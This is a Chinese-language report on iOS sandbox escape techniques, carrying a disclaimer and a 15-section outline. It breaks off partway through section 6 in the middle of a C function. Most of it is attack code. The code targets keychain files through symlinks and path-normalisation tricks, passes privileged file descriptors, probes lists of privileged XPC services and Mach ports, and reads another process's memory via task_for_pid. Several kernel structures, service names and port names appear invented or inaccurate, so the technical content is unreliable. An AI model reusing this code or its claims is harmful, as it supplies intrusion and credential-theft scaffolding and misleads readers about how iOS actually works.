# iOS沙箱逃逸技术详解

## iOS Sandbox Escape Techniques

---

> 作者：pengqinglei99-eng  
> 日期：2026-10-19  
> 版本：v1.0  
> 声明：本报告仅用于安全研究与防御目的，不鼓励任何非法利用行为。

---

## 目录

1. [iOS沙箱架构概述](#1-ios沙箱架构概述)
2. [沙箱策略引擎分析](#2-沙箱策略引擎分析)
3. [沙箱策略语言详解](#3-沙箱策略语言详解)
4. [文件系统沙箱逃逸](#4-文件系统沙箱逃逸)
5. [IPC机制逃逸技术](#5-ipc机制逃逸技术)
6. [Mach端口逃逸技术](#6-mach端口逃逸技术)
7. [网络沙箱绕过](#7-网络沙箱绕过)
8. [设备访问逃逸](#8-设备访问逃逸)
9. [entitlements权限滥用](#9-entitlements权限滥用)
10. [XPC服务逃逸技术](#10-xpc服务逃逸技术)
11. [浏览器沙箱逃逸](#11-浏览器沙箱逃逸)
12. [App沙箱逃逸实战](#12-app沙箱逃逸实战)
13. [沙箱逃逸利用链](#13-沙箱逃逸利用链)
14. [防御机制与检测](#14-防御机制与检测)
15. [未来防御趋势](#15-未来防御趋势)

---

## 1. iOS沙箱架构概述

### 1.1 沙箱安全模型

iOS沙箱是系统安全的核心组件，限制每个进程的能力范围：

```
┌─────────────────────────────────────────────────────┐
│                  iOS安全层级架构                       │
├─────────────────────────────────────────────────────┤
│                                                      │
│  Layer 4: 代码签名验证 (Code Signing)                  │
│  ├── 可执行文件签名                                    │
│  ├── 动态库签名                                       │
│  └── 内存页签名                                       │
│                                                      │
│  Layer 3: 沙箱策略 (Sandbox Policy)                    │
│  ├── 文件访问控制                                      │
│  ├── 网络访问控制                                      │
│  ├── IPC访问控制                                      │
│  └── 设备访问控制                                      │
│                                                      │
│  Layer 2: 进程隔离 (Process Isolation)                 │
│  ├── 虚拟地址空间隔离                                   │
│  ├── 文件描述符隔离                                    │
│  └── Mach端口隔离                                     │
│                                                      │
│  Layer 1: 硬件安全 (Hardware Security)                 │
│  ├── ARM TrustZone                                    │
│  ├── Secure Enclave                                   │
│  └── 内存保护单元                                      │
│                                                      │
└─────────────────────────────────────────────────────┘
```

### 1.2 沙箱实现机制

iOS沙箱基于 TrustedBSD 的 MAC (Mandatory Access Control) 框架实现：

```c
// MAC框架核心结构
struct mac_policy_conf {
    const char      *mpc_name;          // 策略名称 "Sandbox"
    const char      *mpc_fullname;      // 完整名称
    const char      **mpc_labelnames;   // 标签名称列表
    unsigned int    mpc_labelname_count;// 标签数量
    struct mac_policy_ops *mpc_ops;     // 操作函数表
    int             mpc_loadtime_flags;// 加载时标志
    int             *mpc_field_offset;  // 标签字段偏移
    int             mpc_runtime_flags;  // 运行时标志
};

// 沙箱MAC操作函数表
struct mac_policy_ops {
    // 文件操作钩子
    int (*mpo_vnode_check_open)(
        struct ucred *cred,
        struct vnode *vp,
        int acc_mode);
    
    int (*mpo_vnode_check_read)(
        struct ucred *cred,
        struct vnode *vp);
    
    int (*mpo_vnode_check_write)(
        struct ucred *cred,
        struct vnode *vp);
    
    int (*mpo_vnode_check_exec)(
        struct ucred *cred,
        struct vnode *vp);
    
    // 进程操作钩子
    int (*mpo_proc_check_debug)(
        struct ucred *cred,
        struct proc *target);
    
    int (*mpo_proc_check_fork)(
        struct ucred *cred);
    
    int (*mpo_proc_check_signal)(
        struct ucred *cred,
        struct proc *target,
        int signum);
    
    // 网络操作钩子
    int (*mpo_socket_check_connect)(
        struct ucred *cred,
        struct socket *so,
        struct sockaddr *sa);
    
    int (*mpo_socket_check_bind)(
        struct ucred *cred,
        struct socket *so,
        struct sockaddr *sa);
    
    // Mach IPC操作钩子
    int (*mpo_mach_check_msg)(
        struct ucred *cred,
        mach_msg_header_t *msg);
    
    int (*mpo_mach_check_port)(
        struct ucred *cred,
        mach_port_t port,
        mach_port_right_t right);
    
    // IOKit操作钩子
    int (*mpo_iokit_check_open)(
        struct ucred *cred,
        io_object_t service,
        uint32_t user_client_type);
};
```

### 1.3 沙箱初始化流程

```c
// 沙箱初始化流程
// 在进程创建时由kernel调用

int sandbox_init_process(struct proc *p, struct ucred *cred) {
    // 步骤1: 确定沙箱类型
    const char *profile_name = get_sandbox_profile(p);
    // 可能的值: "container", "platform", "application", "web-browser"
    
    // 步骤2: 加载沙箱策略
    char *profile_data = load_sandbox_profile(profile_name);
    if (!profile_data) {
        return ENOENT;
    }
    
    // 步骤3: 编译策略
    sandbox_profile_t *profile = sandbox_compile(profile_data);
    if (!profile) {
        return EINVAL;
    }
    
    // 步骤4: 分配标签
    struct label *label = mac_label_alloc();
    mac_label_set(label, "sandbox", profile);
    
    // 步骤5: 关联到进程
    cred->cr_label = label;
    
    // 步骤6: 应用额外限制
    apply_sandbox_restrictions(p, profile);
    
    return 0;
}

// 沙箱配置文件加载
char *load_sandbox_profile(const char *name) {
    char path[MAXPATHLEN];
    
    // 搜索路径
    const char *search_paths[] = {
        "/usr/share/sandbox/%s.sb",
        "/System/Library/Sandbox/Profiles/%s.sb",
        "/private/var/mobile/Library/Sandbox/%s.sb",
    };
    
    for (int i = 0; i < 3; i++) {
        snprintf(path, sizeof(path), search_paths[i], name);
        
        struct stat st;
        if (stat(path, &st) == 0) {
            // 读取文件内容
            FILE *f = fopen(path, "r");
            if (f) {
                char *data = malloc(st.st_size + 1);
                fread(data, 1, st.st_size, f);
                data[st.st_size] = '\0';
                fclose(f);
                return data;
            }
        }
    }
    
    return NULL;
}
```

### 1.4 沙箱权限矩阵

```c
// 沙箱权限矩阵定义
typedef struct {
    const char  *capability;        // 能力名称
    const char  *description;       // 描述
    bool        default_app;        // 默认App是否拥有
    bool        default_extension;  // 默认扩展是否拥有
    bool        default_daemon;     // 默认守护进程是否拥有
    uint32_t    risk_level;         // 风险等级 (1-10)
} sandbox_capability_t;

sandbox_capability_t capabilities[] = {
    {"file-read-data",          "读取文件数据",         true,  false, true,  3},
    {"file-write-data",         "写入文件数据",         true,  false, true,  5},
    {"network-inbound",         "接收网络连接",         false, false, true,  6},
    {"network-outbound",        "发送网络请求",         true,  false, true,  4},
    {"mach-lookup",             "查找Mach服务",         true,  false, true,  5},
    {"iokit-open",              "打开IOKit服务",        false, false, true,  8},
    {"process-exec",            "执行其他进程",         false, false, true,  7},
    {"process-fork",            "创建子进程",           true,  false, true,  4},
    {"sysctl-read",             "读取系统参数",         true,  false, true,  2},
    {"sysctl-write",            "写入系统参数",         false, false, true,  9},
    {"signal",                  "发送信号",             false, false, true,  6},
    {"ipc-posix-shm",           "共享内存",             false, false, true,  7},
    {"device-camera",           "访问摄像头",           false, false, false, 5},
    {"device-microphone",       "访问麦克风",           false, false, false, 5},
    {"location",                "访问位置信息",         false, false, false, 4},
};
```

---

## 2. 沙箱策略引擎分析

### 2.1 策略编译器

沙箱策略使用Scheme方言编写，由策略编译器解析：

```scheme
;; 典型的iOS应用沙箱策略
(version 1)

;; 默认拒绝所有操作
(deny default)

;; 允许基本的系统操作
(allow process-exec
    (literal "/usr/lib/dyld")
    (literal "/usr/lib/libSystem.B.dylib"))

;; 允许读取应用容器
(allow file-read*
    (subpath "/private/var/mobile/Containers/Data/Application")
    (subpath "/private/var/mobile/Containers/Bundle/Application"))

;; 允许写入应用容器
(allow file-write*
    (subpath "/private/var/mobile/Containers/Data/Application")
    (subpath "/private/var/mobile/Containers/Data/SystemGroup"))

;; 允许网络出站连接
(allow network-outbound)

;; 限制Mach服务查找
(allow mach-lookup
    (global-name "com.apple.dyld")
    (global-name "com.apple.SystemConfiguration.configd")
    (global-name "com.apple.backboardd"))

;; 禁止IOKit访问
(deny iokit-open)

;; 禁止信号发送
(deny signal)

;; 禁止进程fork
(deny process-fork)
```

### 2.2 策略评估引擎

```c
// 沙箱策略评估引擎
typedef struct {
    enum {
        RULE_ALLOW,
        RULE_DENY,
        RULE_FILTER
    }           action;             // 规则动作
    int         operation;          // 操作类型
    void        *filter;            // 过滤器
    uint32_t    priority;           // 优先级
} sandbox_rule_t;

// 策略评估主函数
int sandbox_evaluate(
    struct label *label,
    int operation,
    void *args)
{
    sandbox_profile_t *profile = 
        (sandbox_profile_t *)mac_label_get(label, "sandbox");
    
    if (!profile) {
        // 无沙箱标签 - 允许所有操作
        return 0;
    }
    
    // 遍历规则列表
    for (int i = 0; i < profile->rule_count; i++) {
        sandbox_rule_t *rule = &profile->rules[i];
        
        if (rule->operation != operation) continue;
        
        // 评估过滤器
        if (evaluate_filter(rule->filter, args)) {
            if (rule->action == RULE_ALLOW) {
                return 0;  // 允许
            } else if (rule->action == RULE_DENY) {
                return EACCES;  // 拒绝
            }
        }
    }
    
    // 默认策略
    return profile->default_action == RULE_ALLOW ? 0 : EACCES;
}

// 路径过滤器评估
int evaluate_path_filter(
    void *filter,
    const char *path)
{
    path_filter_t *pf = (path_filter_t *)filter;
    
    switch (pf->type) {
        case FILTER_LITERAL:
            // 精确路径匹配
            return strcmp(path, pf->pattern) == 0;
            
        case FILTER_SUBPATH:
            // 子路径匹配
            return strncmp(path, pf->pattern, 
                          strlen(pf->pattern)) == 0;
            
        case FILTER_REGEX:
            // 正则表达式匹配
            return regexec(&pf->regex, path, 0, NULL, 0) == 0;
            
        case FILTER_GLOB:
            // 通配符匹配
            return fnmatch(pf->pattern, path, 0) == 0;
            
        default:
            return 0;
    }
}
```

### 2.3 沙箱策略继承

```c
// 沙箱策略继承机制
// 子进程可以继承或修改父进程的策略

int sandbox_inherit_profile(
    struct proc *parent,
    struct proc *child)
{
    struct label *parent_label = parent->p_ucred->cr_label;
    sandbox_profile_t *parent_profile = 
        mac_label_get(parent_label, "sandbox");
    
    if (!parent_profile) {
        return 0; // 无沙箱限制
    }
    
    // 检查是否允许fork
    if (!sandbox_check_capability(parent_profile, "process-fork")) {
        return EACCES;
    }
    
    // 创建子进程沙箱
    sandbox_profile_t *child_profile = sandbox_clone_profile(parent_profile);
    
    // 子进程策略不能比父进程更宽松
    // 只能添加更多限制
    child_profile->restrictions_count = parent_profile->restrictions_count;
    
    // 应用子进程策略
    struct label *child_label = mac_label_alloc();
    mac_label_set(child_label, "sandbox", child_profile);
    child->p_ucred->cr_label = child_label;
    
    return 0;
}
```

---

## 3. 沙箱策略语言详解

### 3.1 策略语言语法

```scheme
;; 沙箱策略语言完整语法参考

;; 1. 版本声明
(version 1)

;; 2. 默认动作
(deny default)              ;; 默认拒绝所有
(allow default)             ;; 默认允许所有

;; 3. 文件操作
(allow file-read*)          ;; 允许所有文件读取
(allow file-read-data       ;; 允许读取特定路径
    (literal "/path/to/file")
    (subpath "/path/to/dir")
    (regex #"pattern.*")
    (literal-prefix "/prefix"))

(allow file-write*          ;; 允许写入
    (subpath "/tmp"))

(allow file-map-executable  ;; 允许映射可执行文件
    (subpath "/usr/lib"))

;; 4. 进程操作
(allow process-exec
    (literal "/usr/bin/sandbox-exec"))

(allow process-fork)
(allow process-info*)       ;; 允许获取进程信息

;; 5. 网络操作
(allow network-inbound
    (local-ip "*:8080"))    ;; 允许监听8080端口

(allow network-outbound
    (remote-ip "192.168.1.0/24:*"))

;; 6. Mach IPC
(allow mach-lookup
    (global-name "com.apple.system.kernel.notification"))

(allow mach-register
    (local-name "my-service"))

;; 7. 信号
(allow signal (target same-sandbox))
(deny signal (target self))

;; 8. IOKit
(allow iokit-open
    (iokit-user-client-class "IOSurfaceRootUserClient"))

;; 9. sysctl
(allow sysctl-read
    (sysctl "kern.ostype")
    (sysctl-regex #"kern\\.os.*"))

;; 10. 动态规则
(define (allowed-path)
    (string-append (param "HOME") "/Documents"))

(allow file-read*
    (subpath (allowed-path)))
```

### 3.2 策略参数化

```scheme
;; 参数化沙箱策略

;; 定义参数
(define container-path 
    (param "APPLICATION_CONTAINER"))
(define bundle-path 
    (param "APPLICATION_BUNDLE"))
(define temp-path
    (param "TEMP_DIRECTORY"))

;; 使用参数构建规则
(allow file-read*
    (subpath container-path)
    (subpath bundle-path)
    (subpath temp-path))

(allow file-write*
    (subpath container-path)
    (subpath temp-path))

;; 条件规则
(if (string=? (param "APP_TYPE") "browser")
    (begin
        (allow network-outbound)
        (allow mach-lookup
            (global-name-regex #"com\\.apple\\..*"))))

;; 宏定义
(define-macro (allow-network-access host port)
    `(allow network-outbound
        (remote-ip ,(string-append host ":" (number->string port)))))

;; 使用宏
(allow-network-access "api.example.com" 443)
(allow-network-access "cdn.example.com" 443)
```

### 3.3 策略调试技术

```c
// 沙箱策略调试工具
// 用于分析沙箱拒绝的操作

// 内核沙箱拒绝日志
void sandbox_log_denial(
    struct proc *p,
    int operation,
    const char *detail)
{
    // 记录到内核日志
    printf("Sandbox[%s](%d) deny operation=%d detail=%s\n",
           p->p_comm, p->p_pid, operation, detail);
    
    // 记录到系统日志
    os_log_t log = os_log_create("com.apple.sandbox", "deny");
    os_log(log, "Process %{public}s (%d) denied operation %d: %{public}s",
           p->p_comm, p->p_pid, operation, detail);
}

// 用户空间沙箱日志分析工具
// 使用Console.app或log命令查看
// log stream --predicate 'process == "sandboxd"' --info
// log show --predicate 'eventMessage contains "deny"' --last 1h
```

---

## 4. 文件系统沙箱逃逸

### 4.1 符号链接攻击

```c
// 符号链接攻击绕过文件系统沙箱
// 利用沙箱对符号链接处理不当

#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>

// 攻击场景: 通过/tmp中的符号链接访问受限文件
int symlink_escape(void) {
    // 步骤1: 在可写目录创建符号链接
    const char *link_path = "/tmp/target_link";
    const char *target_path = "/private/var/mobile/Library/Keychains/login.keychain-db";
    
    // 创建符号链接
    unlink(link_path);
    symlink(target_path, link_path);
    
    // 步骤2: 通过符号链接访问
    // 某些服务可能跟随符号链接
    int fd = open(link_path, O_RDONLY);
    if (fd >= 0) {
        char buf[4096];
        ssize_t n = read(fd, buf, sizeof(buf));
        if (n > 0) {
            // 成功读取受限文件
            printf("[+] 读取了 %zd 字节\n", n);
        }
        close(fd);
    }
    
    return 0;
}

// 通过文件系统事件监控绕过
// 利用FSEvents API监控沙箱外文件的变化
#include <CoreServices/CoreServices.h>

void fsevents_monitor(void) {
    FSEventStreamRef stream;
    FSEventStreamContext context = {0, NULL, NULL, NULL, NULL};
    
    // 监控敏感路径
    CFStringRef paths[] = {
        CFSTR("/private/var/mobile/Library/"),
        CFSTR("/private/var/wireless/"),
    };
    CFArrayRef pathArray = CFArrayCreate(
        NULL, (const void **)paths, 2, &kCFTypeArrayCallBacks);
    
    stream = FSEventStreamCreate(
        NULL,
        (FSEventStreamCallback)fs_event_callback,
        &context,
        pathArray,
        kFSEventStreamEventIdSinceNow,
        1.0,  // 延迟1秒
        kFSEventStreamCreateFlagFileEvents);
    
    FSEventStreamScheduleWithRunLoop(stream, 
        CFRunLoopGetCurrent(), kCFRunLoopDefaultMode);
    FSEventStreamStart(stream);
}

void fs_event_callback(
    ConstFSEventStreamRef streamRef,
    void *clientCallBackInfo,
    size_t numEvents,
    void *eventPaths,
    const FSEventStreamEventFlags eventFlags[],
    const FSEventStreamEventId eventIds[])
{
    const char **paths = (const char **)eventPaths;
    
    for (size_t i = 0; i < numEvents; i++) {
        // 获取文件系统事件详情
        printf("[FSEvent] path=%s flags=0x%x\n", 
               paths[i], eventFlags[i]);
        
        // 分析事件类型
        if (eventFlags[i] & kFSEventStreamEventFlagItemCreated) {
            printf("  -> 文件创建\n");
        }
        if (eventFlags[i] & kFSEventStreamEventFlagItemModified) {
            printf("  -> 文件修改\n");
        }
    }
}
```

### 4.2 文件描述符泄露

```c
// 通过文件描述符继承绕过沙箱
// 当服务进程打开文件后传递给沙箱进程

// 攻击场景: 利用XPC服务传递的文件描述符
#include <xpc/xpc.h>

// 沙箱内的XPC客户端
int exploit_fd_leak_xpc(void) {
    xpc_connection_t conn;
    xpc_object_t msg;
    
    // 连接到可能泄露fd的服务
    conn = xpc_connection_create_mach_service(
        "com.apple.some-service",
        NULL, 0);
    
    xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
        // 处理事件
    });
    
    xpc_connection_activate(conn);
    
    // 构造请求，期望服务返回文件描述符
    msg = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_string(msg, "command", "get_data");
    
    // 发送请求并接收响应
    xpc_object_t reply = xpc_connection_send_message_with_reply_sync(
        conn, msg);
    
    // 检查响应中是否包含文件描述符
    xpc_type_t type = xpc_get_type(reply);
    if (type == XPC_TYPE_DICTIONARY) {
        // 尝试提取文件描述符
        int fd = xpc_dictionary_get_fd(reply, "result_fd");
        if (fd >= 0) {
            // 成功获取服务进程的文件描述符
            // 这个fd可能指向沙箱外不允许访问的文件
            char buf[4096];
            ssize_t n = read(fd, buf, sizeof(buf));
            printf("[+] 通过泄露的fd读取了 %zd 字节\n", n);
        }
    }
    
    xpc_release(reply);
    xpc_release(msg);
    xpc_release(conn);
    
    return 0;
}

// 通过Unix域socket传递文件描述符
int exploit_fd_via_socket(void) {
    int sv[2];
    struct msghdr msg;
    struct iovec iov;
    char cmsg_buf[CMSG_SPACE(sizeof(int))];
    char data[1] = {0};
    
    socketpair(AF_UNIX, SOCK_STREAM, 0, sv);
    
    // 构造包含fd的消息
    iov.iov_base = data;
    iov.iov_len = 1;
    
    struct cmsghdr *cmsg = (struct cmsghdr *)cmsg_buf;
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    
    // 将敏感文件的fd传递
    int sensitive_fd = open("/etc/master.passwd", O_RDONLY);
    *(int *)CMSG_DATA(cmsg) = sensitive_fd;
    
    msg.msg_name = NULL;
    msg.msg_namelen = 0;
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = cmsg->cmsg_len;
    msg.msg_flags = 0;
    
    // 发送
    sendmsg(sv[0], &msg, 0);
    
    // 在另一端接收
    int received_fd;
    recvmsg(sv[1], &msg, 0);
    received_fd = *(int *)CMSG_DATA(cmsg);
    
    // 现在沙箱进程拥有了超出权限的fd
    return received_fd;
}
```

### 4.3 挂载点逃逸

```c
// 通过挂载点信息泄露绕过路径过滤
// 沙箱策略通常基于路径匹配，但挂载点可能改变路径语义

#include <sys/param.h>
#include <sys/mount.h>

// 枚举挂载点寻找沙箱外路径
int enumerate_mount_points(void) {
    struct statfs *mounts;
    int count;
    
    count = getmntinfo(&mounts, MNT_WAIT);
    
    for (int i = 0; i < count; i++) {
        printf("[Mount] %s -> %s (type: %s)\n",
               mounts[i].f_mntfromname,
               mounts[i].f_mntonname,
               mounts[i].f_fstypename);
        
        // 寻找可能的逃逸路径
        // 例如: 通过NFS或外部存储挂载点
        if (strcmp(mounts[i].f_fstypename, "nfs") == 0 ||
            strcmp(mounts[i].f_fstypename, "msdos") == 0) {
            printf("[!] 发现外部挂载: %s\n", 
                   mounts[i].f_mntonname);
        }
    }
    
    return 0;
}

// 利用路径规范化差异
// 不同的路径可能指向同一文件，但绕过路径过滤
int path_normalization_escape(void) {
    // 沙箱可能只过滤了规范路径
    // 但以下变体可能绕过过滤
    
    const char *variants[] = {
        "/private/var/mobile/./Library/Keychains/",
        "/private/var/mobile/../mobile/Library/Keychains/",
        "/private//var/mobile/Library/Keychains/",
        "/private/var/mobile/Library/Keychains/.",
        "/private/var/\x6d\x6f\x62\x69\x6c\x65/Library/",
    };
    
    for (int i = 0; i < 5; i++) {
        int fd = open(variants[i], O_RDONLY);
        if (fd >= 0) {
            printf("[+] 路径变体 %d 成功: %s\n", i, variants[i]);
            close(fd);
            return fd;
        }
    }
    
    return -1;
}
```

---

## 5. IPC机制逃逸技术

### 5.1 XPC服务攻击面

```c
// XPC服务逃逸分析
// 通过连接到高权限XPC服务实现沙箱逃逸

#include <xpc/xpc.h>

// 枚举系统中可访问的XPC服务
typedef struct {
    const char  *service_name;    // 服务名称
    const char  *description;     // 描述
    uint32_t    privilege_level;  // 权限级别
    bool        sandbox_bypass;   // 是否可绕过沙箱
} xpc_target_t;

xpc_target_t high_value_targets[] = {
    {"com.apple.backupd",           "Time Machine备份",     9, true},
    {"com.apple.mobile.installation_proxy", "应用安装代理", 8, true},
    {"com.apple.syslogd",           "系统日志守护进程",     7, true},
    {"com.apple.configd",           "系统配置守护进程",     7, true},
    {"com.apple.diskarbitrationd",  "磁盘仲裁守护进程",     8, true},
    {"com.apple.fseventsd",         "文件系统事件守护进程", 6, true},
    {"com.apple.notifyd",           "通知守护进程",         5, false},
    {"com.apple.springboard",       "主屏幕进程",          7, true},
};

// 连接到高权限XPC服务
int connect_to_service(const char *service_name) {
    xpc_connection_t conn;
    
    conn = xpc_connection_create_mach_service(
        service_name,
        dispatch_get_main_queue(),
        0);
    
    if (!conn) {
        printf("[-] 无法创建连接: %s\n", service_name);
        return -1;
    }
    
    xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
        xpc_type_t type = xpc_get_type(event);
        if (type == XPC_TYPE_ERROR) {
            printf("[-] XPC错误: %s\n", 
                   xpc_dictionary_get_string(event, XPC_ERROR_KEY_DESCRIPTION));
        }
    });
    
    xpc_connection_activate(conn);
    
    // 探测服务接受的消息格式
    xpc_object_t probe = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_string(probe, "command", "status");
    
    xpc_object_t reply = xpc_connection_send_message_with_reply_sync(
        conn, probe);
    
    if (xpc_get_type(reply) == XPC_TYPE_DICTIONARY) {
        printf("[+] 服务响应: %s\n", service_name);
        // 分析响应以发现更多可利用的接口
    }
    
    xpc_release(reply);
    xpc_release(probe);
    
    return 0;
}
```

### 5.2 Mach消息IPC逃逸

```c
// 通过Mach IPC实现沙箱逃逸
// 利用Mach端口权限管理缺陷

#include <mach/mach.h>

// 查找高权限Mach端口
typedef struct {
    const char  *port_name;       // 端口名称
    const char  *description;     // 描述
    uint32_t    access_level;     // 访问级别
} mach_port_target_t;

mach_port_target_t port_targets[] = {
    {"com.apple.system.task-port",    "系统任务端口",     10},
    {"com.apple.host-port",           "主机端口",         9},
    {"com.apple.security.debug",      "调试端口",         10},
    {"com.apple.backboard.port",      "BackBoard端口",    7},
    {"com.apple.springboard.port",    "SpringBoard端口",  7},
};

// 尝试获取高权限端口
kern_return_t lookup_privileged_port(
    const char *service_name,
    mach_port_t *port)
{
    mach_port_t bs_port;
    
    // 获取引导端口
    task_get_bootstrap_port(mach_task_self(), &bs_port);
    
    // 查找服务端口
    kern_return_t kr = bootstrap_look_up(
        bs_port, service_name, port);
    
    if (kr == KERN_SUCCESS) {
        printf("[+] 找到服务端口: %s -> %d\n", 
               service_name, *port);
        
        // 检查端口权限
        mach_port_rights_t rights;
        kr = mach_port_get_refs(
            mach_task_self(), *port,
            MACH_PORT_RIGHT_SEND, &rights);
        
        if (kr == KERN_SUCCESS) {
            printf("[+] 端口发送权限: %d\n", rights);
        }
    }
    
    return kr;
}

// 通过Mach端口发送特权请求
kern_return_t send_privileged_request(
    mach_port_t service_port,
    uint32_t request_id,
    void *data,
    size_t data_size)
{
    // 构造复杂的Mach消息
    struct {
        mach_msg_header_t header;
        mach_msg_body_t body;
        mach_msg_ool_descriptor_t ool;
        mach_msg_trailer_t trailer;
    } msg;
    
    msg.header.msgh_bits = MACH_MSGH_BITS_SET(
        MACH_MSG_TYPE_COPY_SEND, 0, 0,
        MACH_MSGH_BITS_COMPLEX);
    msg.header.msgh_size = sizeof(msg) - sizeof(mach_msg_trailer_t);
    msg.header.msgh_remote_port = service_port;
    msg.header.msgh_local_port = MACH_PORT_NULL;
    msg.header.msgh_id = request_id;
    
    msg.body.msgh_descriptor_count = 1;
    msg.ool.address = data;
    msg.ool.size = data_size;
    msg.ool.deallocate = 0;
    msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
    msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
    
    return mach_msg(&msg.header,
        MACH_SEND_MSG,
        msg.header.msgh_size,
        0, MACH_PORT_NULL,
        MACH_MSG_TIMEOUT_NONE,
        MACH_PORT_NULL);
}
```

### 5.3 NSXPC接口逃逸

```objc
// 通过NSXPC接口实现沙箱逃逸
// Objective-C层面的攻击

#import <Foundation/Foundation.h>

// 定义目标服务的协议
@protocol PrivilegedService <NSObject>
- (void)executeCommand:(NSString *)command 
             withReply:(void(^)(NSString *output))reply;
- (NSString *)readFileAtPath:(NSString *)path;
- (NSData *)getDataForIdentifier:(NSString *)identifier;
- (void)setPreference:(NSString *)key 
                value:(id)value;
@end

// 连接到高权限XPC服务
@interface SandboxEscape : NSObject
@property (nonatomic, strong) NSXPCConnection *connection;
@end

@implementation SandboxEscape

- (BOOL)connectToService:(NSString *)serviceName {
    self.connection = [[NSXPCConnection alloc] 
        initWithServiceName:serviceName];
    
    // 设置远程对象协议
    self.connection.remoteObjectInterface = 
        [NSXPCInterface interfaceWithProtocol:@protocol(PrivilegedService)];
    
    [self.connection resume];
    
    // 测试连接
    id remoteObject = [self.connection remoteObjectProxy];
    if (remoteObject) {
        NSLog(@"[+] 成功连接到服务: %@", serviceName);
        return YES;
    }
    
    return NO;
}

// 尝试通过服务读取受限文件
- (NSData *)readRestrictedFile:(NSString *)path {
    __block NSData *result = nil;
    
    id<PrivilegedService> proxy = 
        [self.connection remoteObjectProxyWithErrorHandler:^(NSError *error) {
            NSLog(@"[-] 代理错误: %@", error);
        }];
    
    // 尝试各种方法名
    NSArray *methodNames = @[
        @"readFileAtPath:",
        @"readFile:",
        @"loadFile:",
        @"getFileContents:",
        @"dataForPath:",
    ];
    
    for (NSString *method in methodNames) {
        SEL selector = NSSelectorFromString(method);
        
        if ([proxy respondsToSelector:selector]) {
            NSLog(@"[+] 发现可利用方法: %@", method);
            
            NSInvocation *invocation = [NSInvocation invocationWithMethodSignature:
                [proxy methodSignatureForSelector:selector]];
            invocation.selector = selector;
            invocation.target = proxy;
            
            NSString *targetPath = path;
            [invocation setArgument:&targetPath atIndex:2];
            [invocation invoke];
            
            [invocation getReturnValue:&result];
            if (result) break;
        }
    }
    
    return result;
}

// 利用类型混淆绕过参数验证
- (void)typeConfusionAttack {
    id<PrivilegedService> proxy = [self.connection remoteObjectProxy];
    
    // 发送非预期类型的参数
    // 某些服务可能没有正确验证参数类型
    NSDictionary *malicious = @{
        @"path": @"/private/var/mobile/Library/Keychains/login.keychain-db",
        @"__class__": @"NSFileHandle",  // 尝试类型混淆
        @"mode": @"r",
    };
    
    // 通过setPreference可能触发不安全的反序列化
    [proxy setPreference:@"exploit_key" value:malicious];
}

@end
```

---

## 6. Mach端口逃逸技术

### 6.1 端口权限提升

```c
// Mach端口权限提升技术
// 通过端口集合操作实现权限提升

#include <mach/mach.h>

// 端口集操作 - 监听多个端口
kern_return_t port_set_exploit(void) {
    mach_port_t port_set;
    mach_port_t ports[100];
    kern_return_t kr;
    
    // 创建端口集
    kr = mach_port_allocate(mach_task_self(),
        MACH_PORT_RIGHT_PORT_SET, &port_set);
    
    // 分配多个接收端口
    for (int i = 0; i < 100; i++) {
        kr = mach_port_allocate(mach_task_self(),
            MACH_PORT_RIGHT_RECEIVE, &ports[i]);
        
        // 将端口插入端口集
        kr = mach_port_insert_member(mach_task_self(),
            ports[i], port_set);
    }
    
    // 在端口集上监听消息
    // 可能接收到发往任何成员端口的消息
    struct {
        mach_msg_header_t header;
        char data[1024];
    } msg;
    
    kr = mach_msg(&msg.header,
        MACH_RCV_MSG | MACH_RCV_TIMEOUT,
        0, sizeof(msg),
        port_set,  // 监听端口集
        5000,      // 5秒超时
        MACH_PORT_NULL);
    
    if (kr == KERN_SUCCESS) {
        printf("[+] 接收到消息，目标端口: %d\n",
               msg.header.msgh_local_port);
    }
    
    return kr;
}

// 端口名称重用攻击
kern_return_t port_name_reuse_attack(void) {
    mach_port_t target_name = 0x1000; // 期望获得的端口名称
    mach_port_t ports[10000];
    int allocated = 0;
    
    // 大量分配端口
    for (int i = 0; i < 10000; i++) {
        kern_return_t kr = mach_port_allocate(
            mach_task_self(),
            MACH_PORT_RIGHT_RECEIVE,
            &ports[i]);
        
        if (kr != KERN_SUCCESS) break;
        allocated++;
        
        // 检查是否获得了目标名称
        if (ports[i] == target_name) {
            printf("[+] 获得了目标端口名称!\n");
            return KERN_SUCCESS;
        }
    }
    
    // 释放所有端口
    for (int i = 0; i < allocated; i++) {
        mach_port_deallocate(mach_task_self(), ports[i]);
    }
    
    // 重新分配，期望名称被重用
    mach_port_t retry;
    mach_port_allocate(mach_task_self(),
        MACH_PORT_RIGHT_RECEIVE, &retry);
    
    if (retry == target_name) {
        printf("[+] 端口名称重用成功!\n");
    }
    
    return KERN_FAILURE;
}
```

### 6.2 任务端口获取

```c
// 获取其他进程的任务端口
// 这是沙箱逃逸的关键目标

#include <mach/mach.h>
#include <sys/sysctl.h>

// 通过task_for_pid获取任务端口
kern_return_t acquire_task_port(pid_t target_pid) {
    mach_port_t task_port;
    kern_return_t kr;
    
    // 尝试直接获取
    kr = task_for_pid(mach_task_self(), target_pid, &task_port);
    
    if (kr == KERN_SUCCESS) {
        printf("[+] 成功获取任务端口 (pid=%d)\n", target_pid);
        
        // 有了任务端口，可以:
        // 1. 读写目标进程内存
        // 2. 修改目标进程线程状态
        // 3. 注入代码到目标进程
        
        // 读取目标进程内存示例
        vm_address_t addr = 0;
        vm_size_t size = 4096;
        uint8_t *buffer;
        
        kr = vm_read(task_port, addr, size,
                     (vm_offset_t *)&buffer, &size);
        
        if (kr == KERN_SUCCESS) {
            printf("[+] 读取了 %lu 字节\n", size);
            vm_deallocate(mach_task_self(), 
                         (vm_offset_t)buffer, size);
        }
    }
    
    return kr;
}

// 通过Mach消息间接获取任务端口
// 某些系统服务可能泄露任务端口
kern_return_t indirect_task_port_acquire(void) {
    // 连接到可能泄露任务端口的服务
    mach_port_t service_port;
    
    kern_return_t kr = bootstrap_look_up(
        bootstrap_port,
        "com.apple.system.task-port",
        &service_port);
    
